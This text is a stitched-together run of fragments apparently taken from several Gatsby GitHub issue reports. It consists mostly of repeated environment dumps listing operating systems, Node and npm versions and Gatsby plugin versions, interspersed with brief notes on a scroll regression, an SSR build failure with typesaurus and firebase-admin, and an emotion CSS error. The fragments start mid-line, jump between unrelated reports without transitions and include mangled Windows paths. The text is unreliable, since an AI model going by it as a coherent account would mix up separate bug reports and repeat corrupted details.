1.0.5 gatsby-source-filesystem: ^2.1.43 => 2.1.46 gatsby-source-prismic: ^2.2.0 => 2.2.0 gatsby-transformer-remark: ^2.6.45 => 2.6.48 gatsby-transformer-sharp: ^2.3.9 => 2.3.13 gatsby-transformer-sqip: 2.1.55 => 2.1.55 ```
(if relevant) ```
system: os: linux 4.4 ubuntu 16.04.3 lts (xenial xerus) cpu: (8) x64 intel(r) core(tm) i7-6700t cpu @ 2.80ghz shell: 5.1.1 - /usr/bin/zsh binaries: node: 13.5.0 - /usr/bin/node yarn: 1.21.1 - ~/.yarn/bin/yarn npm: 6.13.4 - /usr/bin/npm languages: python: 2.7.12 - /usr/bin/python npmpackages: gatsby: ^2.18.21 => 2.18.21 gatsby-image: ^2.2.37 => 2.2.37 gatsby-plugin-google-gtag: ^1.1.19 => 1.1.19 gatsby-plugin-manifest: ^2.2.34 => 2.2.34 gatsby-plugin-mdx: ^1.0.67 => 1.0.67 gatsby-plugin-offline: ^3.0.30 => 3.0.30 gatsby-plugin-react-helmet: ^3.1.18 => 3.1.18 gatsby-plugin-sharp: ^2.3.10 => 2.3.10 gatsby-plugin-sitemap: ^2.2.24 => 2.2.24 gatsby-plugin-styled-components: ^3.1.18 => 3.1.18 gatsby-plugin-twitter: ^2.1.17 => 2.1.17 gatsby-remark-images: ^3.1.42 => 3.1.42 gatsby-remark-prismjs: ^3.3.29 => 3.3.29 gatsby-source-filesystem: ^2.1.43 => 2.1.43 gatsby-transformer-remark: ^2.6.45 => 2.6.45 gatsby-transformer-sharp: ^2.3.9 => 2.3.9
system: os: macos 10.14.6 cpu: (8) x64 intel(r) core(tm) i7-7820hq cpu @ 2.90ghz shell: 5.3 - /bin/zsh binaries: node: 10.16.3 - ~/.nvm/versions/node/v10.16.3/bin/node yarn: 1.19.1 - ~/.yarn/bin/yarn npm: 6.9.0 - ~/.nvm/versions/node/v10.16.3/bin/npm languages: python: 2.7.16 - /usr/local/bin/python browsers: chrome: 79.0.3945.130 firefox: 69.0.1 safari: 13.0.4 npmpackages: gatsby: 2.19.7 => 2.19.7 gatsby-image: ^2.2.7 => 2.2.39 gatsby-link: ^2.2.22 => 2.2.22 gatsby-plugin-eslint: ^2.0.4 => 2.0.5 gatsby-plugin-google-tagmanager: ^2.1.3 => 2.1.4 gatsby-plugin-i18next: ^1.1.7 => 1.1.7 gatsby-plugin-react-helmet: ^3.1.1 => 3.1.2 gatsby-plugin-react-svg: ^2.1.1 => 2.1.1 gatsby-plugin-resolve-src: ^2.0.0 => 2.0.0 gatsby-plugin-robots-txt: ^1.5.0 => 1.5.0 gatsby-plugin-sharp: ^2.4.0 => 2.4.3 gatsby-plugin-styled-components: ^3.1.1 => 3.1.2 gatsby-source-contentful: 2.1.82 => 2.1.82 gatsby-source-filesystem: ^2.1.46 => 2.1.46 gatsby-transformer-remark: ^2.6.3 => 2.6.9 gatsby-transformer-sharp: ^2.3.0 => 2.3.13
system: os: macos 10.15.2 cpu: (4) x64 intel(r) core(tm) i7-7567u cpu @ 3.50ghz shell: 3.2.57 - /bin/bash binaries: node: 13.5.0 - /usr/local/bin/node yarn: 1.21.1 - /usr/local/bin/yarn npm: 6.13.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 79.0.3945.130 firefox: 72.0.1 safari: 13.0.4 npmpackages: gatsby: ^2.19.5 => 2.19.5 gatsby-image: 2.2.29 => 2.2.29 gatsby-plugin-extract-schema: 0.0.5 => 0.0.5 gatsby-plugin-manifest: 2.2.23 => 2.2.23 gatsby-plugin-offline: 3.0.16 => 3.0.16 gatsby-plugin-react-helmet: 3.1.13 => 3.1.13 gatsby-plugin-sharp: ^2.3.10 => 2.3.10 gatsby-plugin-styled-components: ^3.1.14 => 3.1.14 gatsby-plugin-typescript: 2.1.15 => 2.1.15 gatsby-source-filesystem: 2.1.33 => 2.1.33 gatsby-source-graphql: ^2.1.31 => 2.1.31 gatsby-transformer-sharp: ^2.3.9 => 2.3.9 ## workaround replace `oncreatepage: gatsbynode["oncreatepage"]` with `oncreatepage: any`.
system: os: macos mojave 10.14.6 cpu: (8) x64 intel(r) core(tm) i5-8279u cpu @ 2.40ghz shell: 3.2.57 - /bin/bash binaries: node: 10.16.0 - /usr/local/bin/node yarn: 1.21.1 - ~/.yarn/bin/yarn npm: 6.9.0 - /usr/local/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 79.0.3945.130 safari: 13.0.4 npmpackages: gatsby: ^2.19.1 => 2.19.1 gatsby-plugin-react-helmet: ^3.1.16 => 3.1.16 gatsby-source-filesystem: ^2.1.40 => 2.1.40 gatsby-transformer-code: ^0.1.0 => 0.1.0 npmglobalpackages: gatsby-dev-cli: 2.5.43
``` system: os: linux 5.3 pop!_os 19.10 cpu: (8) x64 intel(r) core(tm) i7-7700hq cpu @ 2.80ghz shell: 5.7.1 - /usr/bin/zsh binaries: node: 13.0.1 - ~/.nvm/versions/node/v13.0.1/bin/node yarn: 1.19.2 - /usr/bin/yarn npm: 6.12.0 - ~/.nvm/versions/node/v13.0.1/bin/npm languages: python: 2.7.17 - /usr/bin/python browsers: chrome: 78.0.3904.108 firefox: 70.0.1 npmpackages: gatsby: ^2.18.25 => 2.18.25 gatsby-background-image: ^0.9.12 => 0.9.12 gatsby-env-variables: ^1.0.4 => 1.0.4 gatsby-image: ^2.2.39 => 2.2.39 gatsby-plugin-google-analytics: ^2.1.33 => 2.1.33 gatsby-plugin-lodash: ^3.1.19 => 3.1.19 gatsby-plugin-manifest: ^2.2.37 => 2.2.37 gatsby-plugin-netlify: ^2.1.31 => 2.1.31 gatsby-plugin-netlify-cache: ^1.2.0 => 1.2.0 gatsby-plugin-nprogress: ^2.1.18 => 2.1.18 gatsby-plugin-offline: ^3.0.32 => 3.0.32 gatsby-plugin-prefetch-google-fonts: ^1.4.3 => 1.4.3 gatsby-plugin-purgecss: ^4.0.1 => 4.0.1 gatsby-plugin-react-helmet: ^3.1.21 => 3.1.21 gatsby-plugin-react-helmet-canonical-urls: ^1.4.0 => 1.4.0 gatsby-plugin-remove-trailing-slashes: ^2.1.20 => 2.1.20 gatsby-plugin-robots-txt: ^1.5.0 => 1.5.0 gatsby-plugin-sass: ^2.1.27 => 2.1.27 gatsby-plugin-sharp: ^2.3.13 => 2.3.13 gatsby-plugin-sitemap: ^2.2.26 => 2.2.26 gatsby-plugin-transition-link: ^1.17.7 => 1.17.7 gatsby-plugin-ts: ^2.1.1 => 2.1.1 gatsby-source-filesystem: ^2.1.46 => 2.1.46 gatsby-source-graphql: ^2.1.31 => 2.1.31 gatsby-transformer-sharp: ^2.3.13 => 2.3.13 npmglobalpackages: gatsby-cli: 2.8.22
system: os: linux 4.4 ubuntu 18.04.3 lts (bionic beaver) cpu: (6) x64 intel(r) core(tm) i5-9600k cpu @ 3.70ghz shell: 4.4.20 - /bin/bash binaries: node: 12.2.0 - ~/.nvm/versions/node/v12.2.0/bin/node npm: 6.13.0 - ~/.nvm/versions/node/v12.2.0/bin/npm languages: python: 2.7.15+ - /usr/bin/python npmpackages: gatsby: ^2.18.12 => 2.18.12 gatsby-image: ^2.2.34 => 2.2.34 gatsby-plugin-manifest: ^2.2.31 => 2.2.31 gatsby-plugin-offline: ^3.0.27 => 3.0.27 gatsby-plugin-react-helmet: ^3.1.16 => 3.1.16 gatsby-plugin-sharp: ^2.3.5 => 2.3.5 gatsby-source-filesystem: ^2.1.40 => 2.1.40 gatsby-transformer-sharp: ^2.3.7 => 2.3.7 npmglobalpackages: gatsby-cli: 2.8.27
``` system: os: windows 10 10.0.18362 cpu: (16) x64 intel(r) core(tm) i9-9900k cpu @ 3.60ghz binaries: node: 12.14.1 - c:\\program files\ odejs\ ode.exe yarn: 1.21.1 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.13.4 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.17 - /c/python27/python browsers: edge: 44.18362.449.0 npmpackages: gatsby: 2.18.25 => 2.18.25 gatsby-image: 2.2.39 => 2.2.39 gatsby-plugin-manifest: 2.2.37 => 2.2.37 gatsby-plugin-offline: 3.0.32 => 3.0.32 gatsby-plugin-react-helmet: 3.1.21 => 3.1.21 gatsby-plugin-sharp: 2.3.13 => 2.3.13 gatsby-source-filesystem: 2.1.46 => 2.1.46 gatsby-transformer-sharp: 2.3.13 => 2.3.13 ```
``` system: os: macos 10.14.6 cpu: (12) x64 intel(r) core(tm) i7-9750h cpu @ 2.60ghz shell: 5.3 - /bin/zsh binaries: node: 10.16.3 - ~/.nvm/versions/node/v10.16.3/bin/node yarn: 1.21.1 - /usr/local/bin/yarn npm: 6.13.1 - ~/.nvm/versions/node/v10.16.3/bin/npm languages: python: 2.7.17 - /usr/local/bin/python browsers: chrome: 79.0.3945.117 firefox: 71.0 safari: 13.0.4 npmpackages: gatsby: ^2.15.35 => 2.15.35 gatsby-image: ^2.2.26 => 2.2.26 gatsby-plugin-feed: ^2.3.16 => 2.3.16 gatsby-plugin-google-analytics: ^2.1.21 => 2.1.21 gatsby-plugin-lunr: ^1.5.2 => 1.5.2 gatsby-plugin-manifest: ^2.2.21 => 2.2.21 gatsby-plugin-offline: ^3.0.14 => 3.0.14 gatsby-plugin-prefetch-google-fonts: ^1.4.3 => 1.4.3 gatsby-plugin-react-helmet: ^3.1.11 => 3.1.11 gatsby-plugin-react-svg: ^2.1.2 => 2.1.2 gatsby-plugin-sass: ^2.1.18 => 2.1.18 gatsby-plugin-sharp: ^2.2.29 => 2.2.29 gatsby-plugin-sitemap: ^2.2.17 => 2.2.17 gatsby-plugin-transition-link: ^1.13.0 => 1.13.0 gatsby-remark-autolink-headers: ^2.1.14 => 2.1.14 gatsby-remark-copy-linked-files: ^2.1.26 => 2.1.26 gatsby-remark-external-links: 0.0.4 => 0.0.4 gatsby-remark-images: ^3.1.26 => 3.1.26 gatsby-remark-images-medium-zoom: ^1.4.0 => 1.4.0 gatsby-remark-prismjs: ^3.3.18 => 3.3.18 gatsby-remark-responsive-iframe: ^2.2.23 => 2.2.23 gatsby-remark-video: ^1.2.4 => 1.2.4 gatsby-source-filesystem: ^2.1.31 => 2.1.31 gatsby-transformer-json: ^2.2.13 => 2.2.13 gatsby-transformer-remark: ^2.6.28 => 2.6.28 gatsby-transformer-sharp: ^2.2.21 => 2.2.21
system: os: macos 10.15.2 cpu: (4) x64 intel(r) core(tm) i5-5257u cpu @ 2.70ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.14.1 - /var/folders/kd/xcj3shg91bl96wn3bl4_7k6c0000gn/t/fnm-shell-5309695/bin/node npm: 6.13.6 - /var/folders/kd/xcj3shg91bl96wn3bl4_7k6c0000gn/t/fnm-shell-5309695/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 79.0.3945.130 firefox: 71.0 safari: 13.0.4 npmpackages: gatsby: ^2.18.12 => 2.18.12 gatsby-image: ^2.2.34 => 2.2.34 gatsby-plugin-manifest: ^2.2.31 => 2.2.31 gatsby-plugin-offline: ^3.0.27 => 3.0.27 gatsby-plugin-react-helmet: ^3.1.16 => 3.1.16 gatsby-plugin-sharp: ^2.3.5 => 2.3.5 gatsby-source-filesystem: ^2.1.40 => 2.1.40 gatsby-transformer-sharp: ^2.3.7 => 2.3.7 npmglobalpackages: gatsby-cli: 2.8.27
``` system: os: windows 10 10.0.18362 cpu: (8) x64 intel(r) core(tm) i7-8565u cpu @ 1.80ghz binaries: node: 12.13.0 - c:\\program files\ odejs\ ode.exe yarn: 1.21.1 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.12.0 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.17 browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.18.12 => 2.18.22 gatsby-image: ^2.2.34 => 2.2.38 gatsby-plugin-catch-links: ^2.1.23 => 2.1.24 gatsby-plugin-facebook-pixel: ^1.0.3 => 1.0.3 gatsby-plugin-google-analytics: ^2.1.31 => 2.1.33 gatsby-plugin-manifest: ^2.2.36 => 2.2.37 gatsby-plugin-offline: ^3.0.30 => 3.0.31 gatsby-plugin-react-helmet: ^3.1.20 => 3.1.21 gatsby-plugin-root-import: ^2.0.5 => 2.0.5 gatsby-plugin-sharp: ^2.3.12 => 2.3.13 gatsby-plugin-typescript: ^2.1.25 => 2.1.26 gatsby-remark-copy-linked-files: ^2.1.35 => 2.1.36 gatsby-remark-images: ^3.1.41 => 3.1.42 gatsby-remark-prismjs: ^3.3.29 => 3.3.30 gatsby-remark-responsive-iframe: ^2.2.30 => 2.2.31 gatsby-remark-smartypants: ^2.1.19 => 2.1.20 gatsby-source-filesystem: ^2.1.45 => 2.1.46 gatsby-source-shopify: ^3.0.40 => 3.0.40 gatsby-transformer-json: ^2.2.25 => 2.2.25 gatsby-transformer-remark: ^2.6.47 => 2.6.48 gatsby-transformer-sharp: ^2.3.11 => 2.3.12 gatsby-transformer-svg: ^1.0.0 => 1.0.0 ```
gatsby-transformer-sharp@2.3.12 system: os: macos 10.15.2 cpu: (8) x64 intel(r) core(tm) i7-8559u cpu @ 2.70ghz shell: 3.2.57 - /bin/bash binaries: node: 10.16.3 - ~/.npm-global/bin/node yarn: 1.17.3 - ~/.yarn/bin/yarn npm: 6.11.3 - ~/.npm-global/bin/npm languages: python: 2.7.12 - /usr/bin/python browsers: safari: 13.0.4 npmpackages: gatsby-plugin-eslint: ^2.0.5 => 2.0.8 npmglobalpackages: gatsby-cli: 2.8.26
system: os: windows 10 10.0.17763 cpu: (16) x64 amd ryzen 7 1800x eight-core processor binaries: node: 12.14.0 - c:\\program files\ odejs\ ode.exe npm: 6.13.4 - c:\\program files\ odejs\ pm.cmd browsers: edge: 44.17763.831.0
gatsby 2.15.9 ### details after some digging around and going through past releases, looks like the regression was introduced by this ie10-specific fix: (version 2.3.7 and onward) the call to `document.documentelement.doscroll()` in #l19 seems to be causing the page to automatically scroll on load
(this also occurs in windows) edit: updated `gatsby` to 2.18.21 and it is still an issue
``` system: os: macos mojave 10.14.6 cpu: (8) x64 intel(r) core(tm) i7-3615qm cpu @ 2.30ghz shell: 5.3 - /bin/zsh binaries: node: 12.12.0 - /usr/local/bin/node yarn: 1.19.1 - /usr/local/bin/yarn npm: 6.11.3 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/local/bin/python browsers: chrome: 79.0.3945.117 firefox: 72.0 safari: 13.0.4 npmpackages: gatsby: ^2.18.15 => 2.18.15 gatsby-background-image: ^0.9.11 => 0.9.11 gatsby-image: ^2.2.4 => 2.2.36 gatsby-plugin-lodash: ^3.1.2 => 3.1.18 gatsby-plugin-manifest: ^2.2.1 => 2.2.33 gatsby-plugin-polyfill-io: ^1.1.0 => 1.1.0 gatsby-plugin-prefetch-google-fonts: ^1.4.3 => 1.4.3 gatsby-plugin-react-helmet: ^3.0.12 => 3.1.18 gatsby-plugin-remove-serviceworker: ^1.0.0 => 1.0.0 gatsby-plugin-robots-txt: ^1.5.0 => 1.5.0 gatsby-plugin-sass: ^2.1.12 => 2.1.26 gatsby-plugin-sharp: ^2.2.3 => 2.3.7 gatsby-plugin-sitemap: ^2.2.9 => 2.2.24 gatsby-plugin-styled-components: ^3.0.7 => 3.1.16 gatsby-plugin-typescript: ^2.0.15 => 2.1.22 gatsby-plugin-webpack-bundle-analyser-v2: ^1.1.5 => 1.1.8 gatsby-source-filesystem: ^2.1.2 => 2.1.42 gatsby-transformer-sharp: ^2.2.1 => 2.3.9 npmglobalpackages: gatsby-cli: 2.6.7
system: os: macos 10.15.2 cpu: (12) x64 intel(r) core(tm) i9-8950hk cpu @ 2.90ghz shell: 5.7.1 - /bin/zsh binaries: node: 13.6.0 - /usr/local/bin/node yarn: 1.19.2 - /usr/local/bin/yarn npm: 6.13.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 79.0.3945.117 safari: 13.0.4 npmpackages: gatsby: ^2.18.21 => 2.18.21 gatsby-cli: ^2.8.26 => 2.8.26 gatsby-plugin-feed: ^2.3.26 => 2.3.26 gatsby-plugin-mdx: ^1.0.67 => 1.0.67 gatsby-source-filesystem: ^2.1.46 => 2.1.46 npmglobalpackages: gatsby-cli: 2.8.26 gatsby: 2.18.7
``` system: os: macos 10.14.6 cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz shell: 3.2.57 - /bin/bash binaries: node: 12.9.1 - ~/.nvm/versions/node/v12.9.1/bin/node yarn: 1.19.0 - /usr/local/bin/yarn npm: 6.10.2 - ~/.nvm/versions/node/v12.9.1/bin/npm languages: python: 2.7.16 - /usr/local/bin/python browsers: chrome: 79.0.3945.117 safari: 13.0.3 npmpackages: gatsby: ^2.0.21 => 2.15.14 gatsby-image: ^2.0.5 => 2.2.18 gatsby-plugin-algolia: ^0.1.0 => 0.1.1 gatsby-plugin-catch-links: ^2.0.2 => 2.1.9 gatsby-plugin-feed: ^2.0.5 => 2.3.12 gatsby-plugin-google-analytics: ^2.0.6 => 2.1.16 gatsby-plugin-google-tagmanager: ^2.1.23 => 2.1.23 gatsby-plugin-layout: ^1.0.2 => 1.1.7 gatsby-plugin-manifest: ^2.0.2 => 2.2.16 gatsby-plugin-netlify: ^2.0.0 => 2.1.12 gatsby-plugin-offline: ^2.0.6 => 2.2.10 gatsby-plugin-react-helmet: ^3.0.0 => 3.1.7 gatsby-plugin-react-svg: ^2.0.0 => 2.1.2 gatsby-plugin-sharp: ^2.0.5 => 2.2.21 gatsby-plugin-sitemap: ^2.0.1 => 2.2.12 gatsby-plugin-styled-jsx: ^3.0.1 => 3.1.6 gatsby-plugin-styled-jsx-postcss: ^2.0.2 => 2.0.2 gatsby-remark-copy-linked-files: ^2.0.5 => 2.1.19 gatsby-remark-emojis: ^0.2.3 => 0.2.5 gatsby-remark-external-links: ^0.0.4 => 0.0.4 gatsby-remark-images: ^2.0.1 => 2.0.6 gatsby-remark-prismjs: ^3.0.0 => 3.3.13 gatsby-remark-responsive-iframe: ^2.0.5 => 2.2.16 gatsby-remark-smartypants: ^2.0.5 => 2.1.8 gatsby-source-filesystem: ^2.0.1 => 2.1.22 gatsby-transformer-remark: ^2.1.3 => 2.6.22 gatsby-transformer-sharp: ^2.1.1 => 2.2.14 ```
``` system: os: macos mojave 10.14.6 cpu: (4) x64 intel(r) core(tm) i5-4278u cpu @ 2.60ghz shell: 3.2.57 - /bin/bash binaries: node: 8.16.2 - /usr/local/opt/node@8/bin/node yarn: 1.19.1 - /usr/local/bin/yarn npm: 6.4.1 - /usr/local/opt/node@8/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 79.0.3945.88 safari: 13.0.3 npmpackages: gatsby: ^2.18.20 => 2.18.20 gatsby-plugin-firebase: ^0.1.7 => 0.1.7 gatsby-plugin-typescript: ^2.1.25 => 2.1.25 npmglobalpackages: gatsby-cli: 2.8.18
``` # where this is an issue in real life?
using "universal libraries", ie
ones that have an implementation for the browser and one for the server.
in my repro the problem arises when using typesaurus
when doing ssr typesaurus thinks it's running on node and imports firebase-admin
even though i'm not using any of the code while building it will make gatsby fail just because the .proto files are included
@zeit/ncc had the same error and fixed it on their behalf instead of "upstreaming" to webpack: i don\'t know if gatsby could work around this...
as my concern is really how to use typesaurus with gatsby there is a sister issue on typesaurus repository:
system: os: linux 4.15 linux mint 19.2 (tina) cpu: (8) x64 intel(r) core(tm) i7-8565u cpu @ 1.80ghz shell: 4.4.19 - /bin/bash binaries: node: 12.12.0 - ~/.nvm/versions/node/v12.12.0/bin/node npm: 6.11.3 - ~/.nvm/versions/node/v12.12.0/bin/npm languages: python: 2.7.15+ - /usr/bin/python browsers: firefox: 68.0.1 npmpackages: gatsby: 2.18.17 => 2.18.17 gatsby-cli: 2.8.22 => 2.8.22 gatsby-image: 2.2.37 => 2.2.37 gatsby-plugin-mailchimp: 5.1.2 => 5.1.2 gatsby-plugin-manifest: 2.2.34 => 2.2.34 gatsby-plugin-netlify: 2.1.30 => 2.1.30 gatsby-plugin-react-helmet: 3.1.18 => 3.1.18 gatsby-plugin-react-helmet-canonical-urls: 1.4.0 => 1.4.0 gatsby-plugin-robots-txt: 1.5.0 => 1.5.0 gatsby-plugin-sharp: 2.3.10 => 2.3.10 gatsby-plugin-sitemap: 2.2.24 => 2.2.24 gatsby-plugin-styled-components: 3.1.16 => 3.1.16 gatsby-plugin-typescript: ^2.1.23 => 2.1.23 gatsby-plugin-typescript-checker: ^1.1.1 => 1.1.1 gatsby-plugin-webpack-bundle-analyzer: 1.0.5 => 1.0.5 gatsby-source-contentful: 2.1.69 => 2.1.69 gatsby-transformer-sharp: 2.3.9 => 2.3.9 npmglobalpackages: gatsby-cli: 2.8.25
system: windows10 1809 node: v11.13.0
npm: 6.9.0 browsers:
chrome: 79.0.3945.88
firefox: 73.0b1 gatsby cli version: 2.8.23
gatsby version: 2.18.18 <!-- required
run `gatsby info --clipboard` in your gatsby project directory and paste its contents here.
--> ### file contents `gatsby-config.js`: `
module.exports = { ..
plugins: [ // 'gatsby-plugin-postcss', ..
` `package.json`: `
"browserslist": [">0.25%", "not dead"]
` `postcss.config.js`
module.exports = () => ({ plugins: { 'autoprefixer': {}, },
output of `gatsby info --clipboard`: ``` system: os: macos high sierra 10.13.6 cpu: (8) x64 intel(r) core(tm) i7-4870hq cpu @ 2.50ghz shell: 3.2.57 - /bin/bash binaries: node: 11.0.0 - ~/.nvm/versions/node/v11.0.0/bin/node yarn: 1.10.1 - /usr/local/bin/yarn npm: 6.4.1 - ~/.nvm/versions/node/v11.0.0/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 79.0.3945.88 firefox: 59.0.2 safari: 13.0.4 npmpackages: gatsby: ^2.18.17 => 2.18.17 gatsby-image: ^2.2.37 => 2.2.37 gatsby-plugin-canonical-urls: ^2.1.15 => 2.1.15 gatsby-plugin-portal: ^1.0.7 => 1.0.7 gatsby-plugin-purgecss: ^4.0.1 => 4.0.1 gatsby-plugin-react-helmet: ^3.1.15 => 3.1.15 gatsby-plugin-react-svg: ^2.1.2 => 2.1.2 gatsby-plugin-sass: ^2.1.26 => 2.1.26 gatsby-plugin-sentry: ^1.0.1 => 1.0.1 gatsby-plugin-sharp: ^2.3.8 => 2.3.8 gatsby-source-apiserver: ^2.1.4 => 2.1.4 gatsby-source-filesystem: ^2.1.42 => 2.1.42 gatsby-source-graphql: ^2.1.29 => 2.1.29 gatsby-source-greenhouse-job-board: ^1.0.3 => 1.0.3 gatsby-transformer-sharp: ^2.3.9 => 2.3.9 gatsby-transformer-yaml: ^2.2.20 => 2.2.20 npmglobalpackages: gatsby-cli: 2.7.40
``` cc @dandenney @thomascorthouts @slin12
system: os: macos 10.15.1 cpu: (4) x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 3.2.57 - /bin/bash binaries: node: 12.1.0 - ~/.nvm/versions/node/v12.1.0/bin/node yarn: 1.15.2 - ~/.nvm/versions/node/v12.1.0/bin/yarn npm: 6.9.0 - ~/.nvm/versions/node/v12.1.0/bin/npm languages: python: 2.7.16 - /usr/local/bin/python browsers: chrome: 79.0.3945.88 firefox: 69.0 safari: 13.0.3 npmpackages: gatsby: 2.18.18 => 2.18.18 gatsby-link: 2.2.27 => 2.2.27 gatsby-plugin-algolia: 0.5.0 => 0.5.0 gatsby-plugin-catch-links: ^2.1.21 => 2.1.21 gatsby-plugin-emotion: 4.1.18 => 4.1.18 gatsby-plugin-gtag: 1.0.12 => 1.0.12 gatsby-plugin-layout: 1.1.18 => 1.1.18 gatsby-plugin-manifest: 2.2.33 => 2.2.33 gatsby-plugin-mdx: 1.0.61 => 1.0.61 gatsby-plugin-offline: 3.0.29 => 3.0.29 gatsby-plugin-react-helmet: 3.1.18 => 3.1.18 gatsby-plugin-remove-serviceworker: 1.0.0 => 1.0.0 gatsby-plugin-remove-trailing-slashes: 2.1.17 => 2.1.17 gatsby-plugin-sharp: 2.3.7 => 2.3.7 gatsby-plugin-sitemap: 2.2.24 => 2.2.24 gatsby-remark-autolink-headers: 2.1.22 => 2.1.22 gatsby-remark-copy-linked-files: 2.1.33 => 2.1.33 gatsby-remark-images: 3.1.37 => 3.1.37 gatsby-source-filesystem: 2.1.42 => 2.1.42 gatsby-transformer-remark: 2.6.42 => 2.6.42 npmglobalpackages: gatsby-cli: 2.8.22 gatsby: 2.18.17
``` system: os: macos 10.15.2 cpu: (16) x64 intel(r) core(tm) i9-9880h cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.13.0 - ~/.nvm/versions/node/v12.13.0/bin/node yarn: 1.21.1 - /usr/local/bin/yarn npm: 6.12.0 - ~/.nvm/versions/node/v12.13.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 79.0.3945.88 firefox: 71.0 safari: 13.0.4 npmpackages: gatsby: ^2.18.18 => 2.18.18 gatsby-image: ^2.0.23 => 2.2.37 gatsby-plugin-netlify: ^2.0.6 => 2.1.30 gatsby-plugin-netlify-cms: ^4.1.34 => 4.1.34 gatsby-plugin-purgecss: ^4.0.0 => 4.0.1 gatsby-plugin-react-helmet: ^3.0.4 => 3.1.18 gatsby-plugin-sass: ^2.0.7 => 2.1.26 gatsby-plugin-sharp: ^2.2.9 => 2.3.10 gatsby-remark-copy-linked-files: ^2.0.7 => 2.1.33 gatsby-remark-images: ^3.1.6 => 3.1.39 gatsby-remark-relative-images: ^0.2.1 => 0.2.3 gatsby-source-filesystem: ^2.0.26 => 2.1.43 gatsby-transformer-remark: ^2.6.9 => 2.6.45 gatsby-transformer-sharp: ^2.1.9 => 2.3.9 ```
``` system: os: macos mojave 10.14.6 cpu: (8) x64 intel(r) core(tm) i7-7820hq cpu @ 2.90ghz shell: 3.2.57 - /bin/bash binaries: node: 13.2.0 - /usr/local/bin/node yarn: 1.21.1 - /usr/local/bin/yarn npm: 2.15.12 - /usr/local/bin/npm languages: python: 2.7.17 - /usr/local/bin/python browsers: chrome: 79.0.3945.88 firefox: 70.0.1 safari: 13.0.4
``` system: os: linux 4.15 ubuntu 18.04.3 lts (bionic beaver) cpu: (4) x64 intel(r) core(tm) i5-6200u cpu @ 2.30ghz shell: 4.4.20 - /bin/bash binaries: node: 12.12.0 - ~/.nvm/versions/node/v12.12.0/bin/node yarn: 1.21.1 - /usr/bin/yarn npm: 6.13.4 - ~/.nvm/versions/node/v12.12.0/bin/npm languages: python: 2.7.17 - /usr/bin/python browsers: chrome: 79.0.3945.88 firefox: 71.0 npmpackages: gatsby: ^2.18.12 => 2.18.17 gatsby-plugin-emotion: ^4.1.18 => 4.1.18 gatsby-plugin-eslint: 2.0.8 => 2.0.8 gatsby-plugin-manifest: ^2.2.34 => 2.2.34 gatsby-plugin-react-helmet: ^3.1.18 => 3.1.18 gatsby-plugin-webpack-bundle-analyzer: ^1.0.5 => 1.0.5 gatsby-source-filesystem: ^2.1.43 => 2.1.43 gatsby-transformer-json: ^2.2.22 => 2.2.22 npmglobalpackages: gatsby-cli: 2.8.22 gatsby: 2.1.19 ```
system: os: macos mojave 10.14.6 cpu: (8) x64 intel(r) core(tm) i7-8569u cpu @ 2.80ghz shell: 3.2.57 - /bin/bash binaries: node: 13.3.0 - ~/.nvm/versions/node/v13.3.0/bin/node yarn: 1.21.1 - ~/.nvm/versions/node/v13.3.0/bin/yarn npm: 6.13.4 - ~/.nvm/versions/node/v13.3.0/bin/npm languages: python: 3.7.3 - /users/darrens/miniconda3/bin/python browsers: chrome: 79.0.3945.88 firefox: 69.0.3 safari: 13.0.4 npmpackages: gatsby: ^2.18.12 => 2.18.12 gatsby-theme-blog: ^1.2.7 => 1.2.7 npmglobalpackages: gatsby-cli: 2.8.22 additional information
the error messages appear to be caused by the following block of code around lines 57-62 of packages/gatsby-theme-blog/src/components/header.js ```
const iconcss = [ css({ pointerevents: `none`, }), { margin: 4 }, // explicitly leave margin out of theme-ui, this positioning should not change based on theme
i can make the error go away if i change the same block of in node_modules to the following:
const iconcss = [ { pointerevents: "none", }, { margin: 4 }, // explicitly leave margin out of theme-ui, this positioning should not change based on theme
``` not sure if it might be related but issue 997 in emotion-js/emotion mention something about not being able to compose themed css in emotion 10
the same issue mentioned that it might be fixed in version 11.
system: os: linux 4.15 ubuntu 18.04.1 lts (bionic beaver) cpu: (4) x64 intel(r) core(tm) i5-4300u cpu @ 1.90ghz shell: 4.4.19 - /bin/bash binaries: node: 8.10.0 - /usr/bin/node yarn: 1.9.4 - /usr/bin/yarn npm: 6.1.0 - /usr/local/bin/npm languages: python: 2.7.15+ - /usr/bin/python browsers: firefox: 71.0 npmpackages: gatsby: ^2.17.11 => 2.17.11 gatsby-cli: ^2.7.58 => 2.8.9 gatsby-image: ^2.2.23 => 2.2.31 gatsby-plugin-facebook-pixel: ^1.0.3 => 1.0.3 gatsby-plugin-google-gtag: ^1.1.11 => 1.1.15 gatsby-plugin-manifest: ^2.2.20 => 2.2.27 gatsby-plugin-offline: ^2.2.10 => 2.2.10 gatsby-plugin-react-helmet: ^3.1.10 => 3.1.14 gatsby-plugin-remove-trailing-slashes: ^2.1.9 => 2.1.13 gatsby-plugin-robots-txt: ^1.5.0 => 1.5.0 gatsby-plugin-sass: ^2.1.17 => 2.1.21 gatsby-plugin-sharp: ^2.2.27 => 2.2.37 gatsby-plugin-sitemap: ^2.2.17 => 2.2.20 gatsby-source-filesystem: ^2.1.28 => 2.1.36 gatsby-source-shopify: ^3.0.37 => 3.0.37 gatsby-transformer-sharp: ^2.2.19 => 2.3.3 npmglobalpackages: gatsby: 2.18.17
